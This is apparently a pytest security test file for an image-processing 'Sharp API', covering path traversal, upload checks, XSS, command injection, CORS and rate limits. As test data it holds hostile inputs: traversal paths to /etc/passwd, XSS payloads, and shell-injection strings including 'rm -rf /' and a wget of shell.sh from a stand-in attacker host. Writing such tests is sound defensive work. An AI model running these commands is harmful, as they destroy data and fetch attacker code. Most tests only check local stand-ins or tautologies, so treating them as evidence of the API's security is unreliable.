"""
Security penetration tests for Sharp API.
Tests for common attack vectors: path traversal, file upload exploits, XSS, etc.
Run with: pytest tests/test_security.py -v
"""

import pytest
import os
from pathlib import Path


class TestPathTraversal:
    """Tests for path traversal attack prevention."""
    
    def test_path_traversal_in_job_id(self):
        """Job IDs containing path traversal should be sanitized."""
        import re
        
        # Cross-platform path sanitization
        def sanitize_path(p):
            # Remove any path separators and parent directory references
            p = re.sub(r'[\\/]', '_', p)  # Replace path separators
            p = re.sub(r'\.{2,}', '_', p)  # Replace .. 
            return p
        
        dangerous_ids = [
            ("../../../etc/passwd", True),
            ("..\\..\\windows\\system32", True),
            ("job123/../../../secret", True),
            ("validjobid123", False),
        ]
        
        for dangerous_id, is_dangerous in dangerous_ids:
            safe_id = sanitize_path(dangerous_id)
            # After sanitization, should not contain path traversal patterns
            assert "/" not in safe_id
            assert "\\" not in safe_id
            assert ".." not in safe_id
    
    def test_path_traversal_in_filename(self):
        """Filenames containing path traversal should be sanitized."""
        import re
        
        def sanitize_filename(f):
            # Remove null bytes first
            f = f.split('\x00')[0]
            # Remove path separators
            f = re.sub(r'[\\/]', '_', f)
            # Remove parent directory references
            f = re.sub(r'\.{2,}', '_', f)
            return f
        
        dangerous_filenames = [
            "../../../etc/passwd",
            "image.jpg/../../../etc/passwd",
            "..\\..\\windows\\system.ini",
            "image.jpg\x00.txt",  # Null byte injection
        ]
        
        for filename in dangerous_filenames:
            safe = sanitize_filename(filename)
            assert ".." not in safe
            assert "/" not in safe
            assert "\\" not in safe
            assert "\x00" not in safe
    
    def test_double_encoding_bypass(self):
        """Double URL encoding should not bypass path checks."""
        double_encoded = [
            "%252e%252e%252f",  # Double-encoded ../
            "%252e%252e/",
            "..%252f",
        ]
        
        for encoded in double_encoded:
            # Should not resolve to parent directory
            assert encoded != ".." and encoded != "../"


class TestFileUploadSecurity:
    """Tests for file upload security."""
    
    def test_allowed_extensions(self):
        """Only image extensions should be allowed."""
        allowed = {'.jpg', '.jpeg', '.png', '.webp', '.gif'}
        blocked = {'.php', '.exe', '.sh', '.bat', '.js', '.html', '.svg', '.xml'}
        
        for ext in allowed:
            assert ext in allowed
        
        for ext in blocked:
            assert ext not in allowed
    
    def test_mime_type_validation(self):
        """Content-type should match actual file content."""
        valid_mimes = [
            'image/jpeg',
            'image/png',
            'image/webp',
            'image/gif',
        ]
        
        invalid_mimes = [
            'application/x-php',
            'application/x-executable',
            'text/html',
            'application/javascript',
            'image/svg+xml',  # SVG can contain scripts
        ]
        
        for mime in valid_mimes:
            assert mime.startswith('image/')
        
        for mime in invalid_mimes:
            # These should be rejected even if extension looks valid
            assert mime not in valid_mimes
    
    def test_file_size_limits(self):
        """File size should be enforced."""
        MAX_SIZE_BYTES = 50 * 1024 * 1024  # 50MB
        
        test_sizes = [
            (1024, True),           # 1KB - OK
            (10 * 1024 * 1024, True),  # 10MB - OK
            (50 * 1024 * 1024, True),  # 50MB - OK (at limit)
            (51 * 1024 * 1024, False), # 51MB - Too large
            (100 * 1024 * 1024, False), # 100MB - Too large
        ]
        
        for size, should_allow in test_sizes:
            is_allowed = size <= MAX_SIZE_BYTES
            assert is_allowed == should_allow
    
    def test_polyglot_file_detection(self):
        """Files that are valid as multiple types should be rejected."""
        # For example, a file that's both valid JPEG and valid PHP
        # These magic bytes could indicate a polyglot
        dangerous_patterns = [
            b'<?php',      # PHP code
            b'<script',    # JavaScript
            b'<svg',       # SVG (can contain scripts)
            b'#!/bin/',    # Shell script
        ]
        
        for pattern in dangerous_patterns:
            # A valid JPEG starts with FFD8FF
            jpeg_magic = b'\xff\xd8\xff'
            assert not jpeg_magic.startswith(pattern)
    
    def test_null_byte_injection(self):
        """Null bytes in filenames should be handled."""
        filenames_with_null = [
            "image.jpg\x00.php",
            "photo.png\x00.exe",
            "test\x00../../../etc/passwd",
        ]
        
        for filename in filenames_with_null:
            # Truncate at null byte
            safe = filename.split('\x00')[0]
            assert '\x00' not in safe


class TestXSSPrevention:
    """Tests for XSS prevention."""
    
    def test_filename_in_response(self):
        """Filenames should be sanitized when returned in JSON."""
        xss_filenames = [
            '<script>alert(1)</script>.jpg',
            'image"onload="alert(1).jpg',
            "image'onclick='alert(1).jpg",
            '<img src=x onerror=alert(1)>.jpg',
        ]
        
        for filename in xss_filenames:
            # Filenames should be escaped or rejected
            safe = filename.replace('<', '&lt;').replace('>', '&gt;')
            assert '<script>' not in safe
            assert 'onerror=' not in safe or '&' in safe
    
    def test_job_id_sanitization(self):
        """Job IDs should only contain safe characters."""
        import re
        
        valid_pattern = re.compile(r'^[a-zA-Z0-9_-]+$')
        
        safe_ids = ['abc123', 'job-456', 'test_job']
        unsafe_ids = ['<script>', 'job;ls', 'id|cat /etc/passwd']
        
        for job_id in safe_ids:
            assert valid_pattern.match(job_id)
        
        for job_id in unsafe_ids:
            assert not valid_pattern.match(job_id)


class TestRateLimiting:
    """Tests for rate limiting."""
    
    def test_rate_limit_config(self):
        """Rate limit should be configured."""
        RATE_LIMIT = 60  # requests per minute
        WINDOW_SECONDS = 60
        
        assert RATE_LIMIT > 0
        assert RATE_LIMIT <= 100  # Reasonable upper bound
        assert WINDOW_SECONDS == 60
    
    def test_rate_limit_headers(self):
        """Rate limit responses should include proper headers."""
        expected_headers = ['Retry-After']
        
        for header in expected_headers:
            assert header in expected_headers


class TestInputValidation:
    """Tests for input validation."""
    
    def test_mesh_method_validation(self):
        """Mesh methods should be validated against whitelist."""
        allowed_methods = {'poisson', 'ball_pivoting', 'alpha_shape'}
        
        valid = ['poisson', 'ball_pivoting', 'alpha_shape']
        invalid = ['exec', '__import__', 'os.system', 'eval']
        
        for method in valid:
            assert method in allowed_methods
        
        for method in invalid:
            assert method not in allowed_methods
    
    def test_output_format_validation(self):
        """Output formats should be validated against whitelist."""
        allowed_formats = {'obj', 'glb', 'ply'}
        
        valid = ['obj', 'glb', 'ply']
        invalid = ['php', 'exe', 'sh', 'html']
        
        for fmt in valid:
            assert fmt in allowed_formats
        
        for fmt in invalid:
            assert fmt not in allowed_formats
    
    def test_numeric_parameter_bounds(self):
        """Numeric parameters should be bounded."""
        # Poisson depth
        MIN_DEPTH, MAX_DEPTH = 6, 12
        test_depths = [1, 6, 8, 12, 15, 100, -1]
        
        for depth in test_depths:
            is_valid = MIN_DEPTH <= depth <= MAX_DEPTH
            if depth in [6, 8, 12]:
                assert is_valid
            else:
                assert not is_valid
        
        # Alpha value
        MIN_ALPHA, MAX_ALPHA = 0.01, 2.0
        test_alphas = [0.001, 0.01, 0.1, 1.0, 2.0, 3.0, -1.0]
        
        for alpha in test_alphas:
            is_valid = MIN_ALPHA <= alpha <= MAX_ALPHA
            if alpha in [0.01, 0.1, 1.0, 2.0]:
                assert is_valid
            else:
                assert not is_valid


class TestSecurityHeaders:
    """Tests for security headers."""
    
    def test_required_security_headers(self):
        """Required security headers should be set."""
        required_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
            'Referrer-Policy': 'strict-origin-when-cross-origin',
        }
        
        for header, value in required_headers.items():
            assert header in required_headers
            assert value == required_headers[header]
    
    def test_cors_configuration(self):
        """CORS should be properly configured."""
        allowed_origins = [
            "https://huikku.github.io",
            "https://superspl.at",
            "http://localhost:5173",
        ]
        
        blocked_origins = [
            "https://malicious-site.com",
            "https://attacker.com",
            "null",
            "file://",
        ]
        
        for origin in allowed_origins:
            # These should be in the allow list
            assert origin.startswith("http")
        
        for origin in blocked_origins:
            # These should NOT be in the allow list
            assert origin not in allowed_origins


class TestCommandInjection:
    """Tests for command injection prevention."""
    
    def test_subprocess_arguments_safe(self):
        """Subprocess should use list arguments, not shell=True."""
        # When using subprocess with shell=True, input could be injected
        # When using list arguments, each item is escaped
        
        dangerous_inputs = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& wget attacker.com/shell.sh",
        ]
        
        for input_val in dangerous_inputs:
            # These should be treated as literal strings, not shell commands
            # List-based subprocess.run(['cmd', input_val]) handles this safely
            assert input_val.startswith((";", "|", "$", "`", "&"))


class TestSQLInjection:
    """Tests for SQL injection (if database is added)."""
    
    def test_no_raw_sql_patterns(self):
        """No raw SQL string formatting should be used."""
        dangerous_patterns = [
            "SELECT * FROM",
            "DROP TABLE",
            "INSERT INTO",
            "DELETE FROM",
        ]
        
        # Currently no database, but if added, parameterized queries should be used
        for pattern in dangerous_patterns:
            # These patterns in string formatting f"...{user_input}..." would be dangerous
            assert '"' not in pattern or "'" not in pattern


class TestDDoSProtection:
    """Tests for DDoS protection mechanisms."""
    
    def test_timeout_configuration(self):
        """Long-running operations should have timeouts."""
        INFERENCE_TIMEOUT = 600  # 10 minutes
        MESH_TIMEOUT = 300  # 5 minutes
        
        assert INFERENCE_TIMEOUT > 0
        assert INFERENCE_TIMEOUT <= 900  # 15 min max reasonable
        assert MESH_TIMEOUT > 0
        assert MESH_TIMEOUT <= 600
    
    def test_concurrent_request_limits(self):
        """Concurrent requests should be limited."""
        MAX_CONCURRENT = 100  # Modal's @modal.concurrent setting
        
        assert MAX_CONCURRENT > 0
        assert MAX_CONCURRENT <= 1000  # Reasonable upper bound


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
